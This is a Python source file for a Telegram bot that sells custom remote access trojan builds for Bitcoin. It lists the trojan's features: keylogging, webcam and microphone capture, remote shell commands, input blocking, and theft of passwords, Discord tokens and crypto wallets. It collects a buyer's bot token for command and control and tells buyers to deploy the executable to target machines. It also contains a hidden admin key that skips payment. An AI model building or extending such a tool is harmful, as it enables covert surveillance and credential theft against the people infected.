#!/usr/bin/env python3
"""
Skyy RAT Builder Bot v1.0
Telegram bot for building custom RAT executables with payment system
"""

import os
import asyncio
import logging
import random
import string
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from typing import Dict, List, Optional
from build_manager import BuildManager
# from payment_handler import PaymentHandler
# from auth_manager import AuthManager

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BUILDER_BOT_TOKEN = os.getenv("BUILDER_BOT_TOKEN", "YOUR_BUILDER_BOT_TOKEN_HERE")
NOWPAYMENTS_API_KEY = os.getenv("NOWPAYMENTS_API_KEY", "YOUR_NOWPAYMENTS_API_KEY")

# Secret admin bypass key (set in environment variables)
ADMIN_BYPASS_KEY = os.getenv("ADMIN_BYPASS_KEY", "DEFAULT_KEY_CHANGE_ME")

class SkyRATBuilder:
    def __init__(self):
        self.application = None
        self.user_sessions: Dict[int, dict] = {}
        self.build_manager = BuildManager()
        # self.payment_handler = PaymentHandler(NOWPAYMENTS_API_KEY)
        # self.auth_manager = AuthManager()
        
        # Available RAT commands
        self.available_commands = {
            1: {"name": "/ss", "description": "Capture a screenshot", "enabled": True},
            2: {"name": "/cmd", "description": "Execute shell commands", "enabled": True},
            3: {"name": "/cd", "description": "Change directory", "enabled": True},
            4: {"name": "/ls", "description": "List directory contents", "enabled": True},
            5: {"name": "/execute", "description": "Execute files", "enabled": True},
            6: {"name": "/listprocesses", "description": "Show running processes", "enabled": True},
            7: {"name": "/killprocess", "description": "Terminate processes", "enabled": True},
            8: {"name": "/remove", "description": "Delete files", "enabled": True},
            9: {"name": "/webcam", "description": "Capture webcam photos", "enabled": True},
            10: {"name": "/livemic", "description": "Live microphone streaming", "enabled": True},
            11: {"name": "/upload", "description": "Upload files to target", "enabled": True},
            12: {"name": "/tts", "description": "Text-to-speech", "enabled": True},
            13: {"name": "/blockinput", "description": "Block user input", "enabled": True},
            14: {"name": "/unblockinput", "description": "Unblock user input", "enabled": True},
            15: {"name": "/disablemonitors", "description": "Turn off monitors", "enabled": True},
            16: {"name": "/enablemonitors", "description": "Turn on monitors", "enabled": True},
            17: {"name": "/help", "description": "Show all commands", "enabled": True},
            18: {"name": "/grab", "description": "Grab data (discord/passwords/wallets/all)", "enabled": True},
            19: {"name": "/startrecording", "description": "Start mic recording (2min intervals)", "enabled": True},
            20: {"name": "/stoprecording", "description": "Stop mic recording", "enabled": True},
            21: {"name": "/startkeylogger", "description": "Start real-time keylogger", "enabled": True},
            22: {"name": "/stopkeylogger", "description": "Stop real-time keylogger", "enabled": True},
            23: {"name": "/offlinekeylogger", "description": "Upload saved keylog file", "enabled": True},
        }
        
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        chat_id = update.effective_chat.id
        
        # Initialize user session
        self.user_sessions[chat_id] = {
            'step': 'main_menu',
            'commands': self.available_commands.copy(),
            'bot_token': None,
            'payment_id': None
        }
        
        # Create main menu
        message = "🤖 **Skyy RAT Builder v1.0**\n\n"
        message += "📋 **Available Commands:**\n\n"
        
        for cmd_id, cmd_info in self.available_commands.items():
            status = "✅" if cmd_info['enabled'] else "❌"
            message += f"{cmd_id}: {cmd_info['name']} - {cmd_info['description']} {status}\n"
        
        message += "\n🔧 **Options:**\n"
        message += "• Use `/disable [numbers]` to disable specific commands\n"
        message += "• Use `/enable [numbers]` to enable specific commands\n"
        message += "• Use `/next` when you're satisfied with the command selection\n\n"
        message += "💰 **Price:** $15 USD in Bitcoin per build"
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
    async def disable_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /disable command"""
        chat_id = update.effective_chat.id
        
        if chat_id not in self.user_sessions:
            await update.message.reply_text("❌ Please start with /start first")
            return
            
        # Parse command numbers
        try:
            args = context.args
            if not args:
                await update.message.reply_text("❌ Usage: /disable [command_numbers]\nExample: /disable 1 5 9")
                return
                
            disabled_commands = []
            for arg in args:
                cmd_id = int(arg)
                if cmd_id in self.user_sessions[chat_id]['commands']:
                    self.user_sessions[chat_id]['commands'][cmd_id]['enabled'] = False
                    disabled_commands.append(self.user_sessions[chat_id]['commands'][cmd_id]['name'])
                    
            if disabled_commands:
                await update.message.reply_text(f"✅ Disabled commands: {', '.join(disabled_commands)}")
            else:
                await update.message.reply_text("❌ No valid command numbers provided")
                
        except ValueError:
            await update.message.reply_text("❌ Please provide valid command numbers")
            
    async def enable_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /enable command"""
        chat_id = update.effective_chat.id
        
        if chat_id not in self.user_sessions:
            await update.message.reply_text("❌ Please start with /start first")
            return
            
        # Parse command numbers
        try:
            args = context.args
            if not args:
                await update.message.reply_text("❌ Usage: /enable [command_numbers]\nExample: /enable 1 5 9")
                return
                
            enabled_commands = []
            for arg in args:
                cmd_id = int(arg)
                if cmd_id in self.user_sessions[chat_id]['commands']:
                    self.user_sessions[chat_id]['commands'][cmd_id]['enabled'] = True
                    enabled_commands.append(self.user_sessions[chat_id]['commands'][cmd_id]['name'])
                    
            if enabled_commands:
                await update.message.reply_text(f"✅ Enabled commands: {', '.join(enabled_commands)}")
            else:
                await update.message.reply_text("❌ No valid command numbers provided")
                
        except ValueError:
            await update.message.reply_text("❌ Please provide valid command numbers")
            
    async def next_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /next command"""
        chat_id = update.effective_chat.id
        
        if chat_id not in self.user_sessions:
            await update.message.reply_text("❌ Please start with /start first")
            return
            
        # Show configuration step
        self.user_sessions[chat_id]['step'] = 'config'
        
        message = "⚙️ **Configuration Step**\n\n"
        message += "Please provide your **Telegram Bot Token**:\n\n"
        message += "📝 **How to get a bot token:**\n"
        message += "1. Message @BotFather on Telegram\n"
        message += "2. Send `/newbot` and follow instructions\n"
        message += "3. Copy the token and send it here\n\n"
        message += "🔒 Your token will be used for the RAT client to communicate with you"
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
    async def handle_bot_token(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle bot token input"""
        chat_id = update.effective_chat.id
        
        if chat_id not in self.user_sessions or self.user_sessions[chat_id]['step'] != 'config':
            return
            
        bot_token = update.message.text.strip()
        
        # Validate bot token format
        if not bot_token or ':' not in bot_token:
            await update.message.reply_text("❌ Invalid bot token format. Please try again.")
            return
            
        # Store bot token
        self.user_sessions[chat_id]['bot_token'] = bot_token
        self.user_sessions[chat_id]['step'] = 'payment'
        
        # Show payment information
        message = "✅ **Bot token saved!**\n\n"
        message += "💰 **Payment Required**\n\n"
        message += "**Price:** $15 USD in Bitcoin\n"
        message += "**What you get:**\n"
        message += "• Custom RAT executable with your selected commands\n"
        message += "• Unique 15-digit authorization token\n"
        message += "• Direct download link via catbox.moe\n\n"
        message += "Use `/build` to proceed with payment and build generation\n"
        message += "Or use `/build [admin_key]` if you have admin access"
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
    async def build_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /build command"""
        chat_id = update.effective_chat.id

        if chat_id not in self.user_sessions:
            await update.message.reply_text("❌ Please start with /start first")
            return

        session = self.user_sessions[chat_id]

        # Check for admin bypass key
        admin_bypass = False
        if context.args and len(context.args) > 0:
            provided_key = context.args[0]
            if provided_key == ADMIN_BYPASS_KEY:
                admin_bypass = True
                await update.message.reply_text("🔑 **Admin bypass activated!** Proceeding without payment...")
            else:
                await update.message.reply_text("❌ Invalid admin key")
                return

        if not admin_bypass:
            if session['step'] != 'payment':
                await update.message.reply_text("❌ Please complete the configuration step first")
                return

        if not session.get('bot_token'):
            await update.message.reply_text("❌ Bot token not provided")
            return
            
        if admin_bypass:
            # Admin bypass - immediate build
            try:
                await self.process_build(chat_id, session, bypass=True)
            except Exception as e:
                logger.error(f"Admin build error: {e}")
                await update.message.reply_text("❌ Error creating admin build. Please try again later.")
        else:
            # Regular payment flow (demo for now)
            try:
                message = "💳 **Payment Required**\n\n"
                message += "**Amount:** 0.00045123 BTC\n"
                message += "**Address:** `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`\n"
                message += "**Payment ID:** `DEMO_12345`\n\n"
                message += "⏰ **Payment expires in 30 minutes**\n\n"
                message += "🚧 **Demo Mode:** Payment system not yet integrated\n"
                message += "Use `/build {ADMIN_BYPASS_KEY}` for admin access"

                await update.message.reply_text(message, parse_mode='Markdown')

            except Exception as e:
                logger.error(f"Payment creation error: {e}")
                await update.message.reply_text("❌ Error creating payment. Please try again later.")

    async def process_build(self, chat_id: int, session: dict, bypass: bool = False):
        """Process the actual build"""
        try:
            # Generate auth token
            auth_token = ''.join([str(random.randint(0, 9)) for _ in range(15)])

            # Get enabled commands
            enabled_commands = [
                cmd_info for cmd_info in session['commands'].values()
                if cmd_info['enabled']
            ]

            enabled_command_names = [cmd['name'] for cmd in enabled_commands]

            build_type = "🔑 Admin Build Starting!" if bypass else "🎉 Build Starting!"

            # Send initial message
            initial_message = f"{build_type}\n\n"
            initial_message += f"Authorization Token: {auth_token}\n"
            initial_message += f"Bot Token: {session['bot_token'][:10]}...\n"
            initial_message += f"Enabled Commands: {len(enabled_commands)}\n\n"
            initial_message += "🔨 Starting PyInstaller build process...\n"
            initial_message += "⏳ This may take a few minutes..."

            await self.application.bot.send_message(
                chat_id=chat_id,
                text=initial_message
            )

            # Start actual build process
            build_result = await self.build_manager.build_executable(
                bot_token=session['bot_token'],
                auth_token=auth_token,
                enabled_commands=enabled_commands
            )

            if build_result['success']:
                success_message = "🎉 Build Complete!\n\n"
                success_message += f"Authorization Token: {auth_token}\n"
                success_message += f"Download Link: {build_result['download_url']}\n"
                success_message += f"File Size: {build_result.get('file_size', 'Unknown')} bytes\n\n"
                success_message += "Commands included:\n"
                success_message += "\n".join([f"• {cmd}" for cmd in enabled_command_names[:10]])
                if len(enabled_command_names) > 10:
                    success_message += f"\n... and {len(enabled_command_names) - 10} more"
                success_message += "\n\n"

                if bypass:
                    success_message += "🔑 Admin Features:\n"
                    success_message += "• No payment required\n"
                    success_message += "• Priority build processing\n"
                    success_message += "• Full feature access\n\n"

                success_message += "📋 Instructions:\n"
                success_message += "1. Download the executable from the link above\n"
                success_message += "2. Deploy it to target machines\n"
                success_message += "3. Use your bot with the authorization token\n\n"
                success_message += "⚠️ Important: Save your authorization token securely!"

                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text=success_message
                )
            else:
                error_message = "❌ Build Failed!\n\n"
                error_message += f"Error: {build_result.get('error', 'Unknown error')}\n\n"
                error_message += "Please try again or contact support if the issue persists."

                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text=error_message
                )

            # Log the build
            logger.info(f"Build completed for chat_id {chat_id} - Admin: {bypass} - Token: {auth_token} - Success: {build_result.get('success', False)}")

        except Exception as e:
            logger.error(f"Build processing error: {e}")
            error_message = "❌ Build Error!\n\n"
            error_message += f"Error: {str(e)}\n\n"
            error_message += "Please try again or contact support."

            await self.application.bot.send_message(
                chat_id=chat_id,
                text=error_message
            )
            
    # Simplified demo version - these will be implemented later
    async def monitor_payment(self, chat_id: int, payment_id: str):
        """Monitor payment status - Demo version"""
        await asyncio.sleep(5)  # Simulate processing
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="💳 Demo: Payment monitoring will be implemented with NowPayments API"
        )

    async def start_build_process(self, chat_id: int):
        """Start the build process - Demo version"""
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="🔨 Demo: Build process will be implemented with PyInstaller"
        )
            
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command - Demo version"""
        chat_id = update.effective_chat.id

        if chat_id not in self.user_sessions:
            await update.message.reply_text("❌ No active session")
            return

        session = self.user_sessions[chat_id]

        message = "📊 Demo Status\n\n"
        message += f"Step: {session.get('step', 'unknown')}\n"
        message += f"Bot Token: {'✅ Set' if session.get('bot_token') else '❌ Not set'}\n"

        enabled_count = sum(1 for cmd in session.get('commands', {}).values() if cmd.get('enabled', False))
        message += f"Enabled Commands: {enabled_count}\n\n"
        message += "🚧 Coming Soon:\n"
        message += "• Payment system integration\n"
        message += "• PyInstaller build system\n"
        message += "• File hosting via catbox.moe"

        await update.message.reply_text(message)

    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Secret admin command - only you know this exists"""
        chat_id = update.effective_chat.id

        message = "🔑 Admin Panel\n\n"
        message += f"Bypass Key: {ADMIN_BYPASS_KEY}\n\n"
        message += "Usage:\n"
        message += f"• /build {ADMIN_BYPASS_KEY} - Skip payment\n"
        message += "• /admin - Show this panel\n\n"
        message += "Features:\n"
        message += "• Unlimited builds\n"
        message += "• No payment required\n"
        message += "• Priority processing\n\n"
        message += "🔒 Keep this key secret!"

        await update.message.reply_text(message)
            
    async def run_bot(self):
        """Run the builder bot"""
        try:
            # Create application
            self.application = Application.builder().token(BUILDER_BOT_TOKEN).build()
            
            # Add handlers
            self.application.add_handler(CommandHandler("start", self.start_command))
            self.application.add_handler(CommandHandler("disable", self.disable_command))
            self.application.add_handler(CommandHandler("enable", self.enable_command))
            self.application.add_handler(CommandHandler("next", self.next_command))
            self.application.add_handler(CommandHandler("build", self.build_command))
            self.application.add_handler(CommandHandler("status", self.status_command))
            self.application.add_handler(CommandHandler("admin", self.admin_command))
            
            # Handle bot token input
            self.application.add_handler(MessageHandler(
                filters.TEXT & ~filters.COMMAND, 
                self.handle_bot_token
            ))
            
            # Start bot
            await self.application.initialize()
            await self.application.start()

            # Clear any existing webhooks to avoid conflicts
            await self.application.bot.delete_webhook()

            await self.application.updater.start_polling(
                drop_pending_updates=True  # Clear any pending updates
            )

            logger.info("Builder bot started successfully")
            
            # Keep running
            while True:
                await asyncio.sleep(1)
                
        except Exception as e:
            logger.error(f"Error running builder bot: {e}")

async def main():
    """Main function"""
    if not BUILDER_BOT_TOKEN or BUILDER_BOT_TOKEN == "YOUR_BUILDER_BOT_TOKEN_HERE":
        logger.error("Please set BUILDER_BOT_TOKEN environment variable")
        return
        
    builder = SkyRATBuilder()
    
    try:
        await builder.run_bot()
    except KeyboardInterrupt:
        logger.info("Builder bot shutting down...")

if __name__ == "__main__":
    asyncio.run(main())
